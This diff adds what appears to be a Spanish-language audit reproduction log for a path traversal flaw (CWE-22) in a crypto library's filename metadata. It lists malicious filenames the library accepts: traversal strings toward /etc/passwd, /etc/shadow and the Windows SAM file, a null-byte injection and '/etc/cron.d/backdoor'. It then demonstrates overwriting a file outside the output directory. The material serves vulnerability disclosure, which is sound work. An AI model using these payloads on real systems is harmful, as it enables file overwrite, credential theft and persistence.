@@ -1,0 +1,76 @@
+########################################################################
+#           REPRODUCCION VULN-001: Path Traversal via filename         #
+#                        CWE-22 — Severidad HIGH                       #
+########################################################################
+
+========================================================================
+  CASO 1 — Path traversal en SDDV (crypto/aead.py)
+========================================================================
+
+  El atacante intenta cifrar 34 bytes con cada uno de
+  estos filenames maliciosos:
+
+  [VULNERABLE - ACEPTADO] filename = '../../../etc/passwd'
+             metadata['filename'] retornado = '../../../etc/passwd'
+
+  [VULNERABLE - ACEPTADO] filename = '/etc/shadow'
+             metadata['filename'] retornado = '/etc/shadow'
+
+  [VULNERABLE - ACEPTADO] filename = '..\\..\\Windows\\System32\\config\\SAM'
+             metadata['filename'] retornado = '..\\..\\Windows\\System32\\config\\SAM'
+
+  [VULNERABLE - ACEPTADO] filename = 'valid.txt\x00../../../tmp/pwned'
+             metadata['filename'] retornado = 'valid.txt\x00../../../tmp/pwned'
+
+  [VULNERABLE - ACEPTADO] filename = '/absolute/path/to/critical.conf'
+             metadata['filename'] retornado = '/absolute/path/to/critical.conf'
+
+  [VULNERABLE - ACEPTADO] filename = '....//....//etc/secret'
+             metadata['filename'] retornado = '....//....//etc/secret'
+
+
+========================================================================
+  CASO 2 — Path traversal en SDDH (crypto/hybrid.py)
+========================================================================
+
+  El atacante intenta cifrar para Bob con filenames maliciosos:
+
+  [VULNERABLE - ACEPTADO] filename = '../../../tmp/pwned.txt'
+             metadata['filename'] retornado = '../../../tmp/pwned.txt'
+
+  [VULNERABLE - ACEPTADO] filename = '/etc/cron.d/backdoor'
+             metadata['filename'] retornado = '/etc/cron.d/backdoor'
+
+
+========================================================================
+  CASO 3 — Explotacion concreta: escritura fuera del directorio
+========================================================================
+
+  Simulamos una aplicacion vulnerable que descifra un contenedor y guarda
+  el plaintext con el filename del metadata. Esto es un patron tipico:
+
+      plaintext, meta = decrypt_file(container, key)
+      with open(os.path.join(out_dir, meta['filename']), 'wb') as f:
+          f.write(plaintext)
+
+  Directorio destino legitimo: /tmp/sddv_audit_s5tfsw2a
+  Archivo critico (existe ANTES del ataque): /tmp/critical_93wzg7ul/config.cfg
+  Contenido original: contenido_legitimo=true
+
+  El atacante construye filename relativo: '../critical_93wzg7ul/config.cfg'
+  Aplicacion recibe metadata['filename'] = '../critical_93wzg7ul/config.cfg'
+  Aplicacion escribe en: os.path.join('/tmp/sddv_audit_s5tfsw2a', '../critical_93wzg7ul/config.cfg')
+
+  Contenido despues del ataque: contenido_malicioso=true
+
+  [!!! VULNERABILIDAD CONFIRMADA !!!]
+  El archivo /tmp/critical_93wzg7ul/config.cfg fue sobrescrito por
+  el contenido controlado por el atacante. La libreria cripto no
+  detuvo este ataque.
+
+========================================================================
+  CONCLUSION:
+  El sistema acepta cualquier filename arbitrario sin validar y lo
+  retorna intacto al descifrar. Cualquier aplicacion que use
+  metadata['filename'] como path es vulnerable a path traversal.
+========================================================================
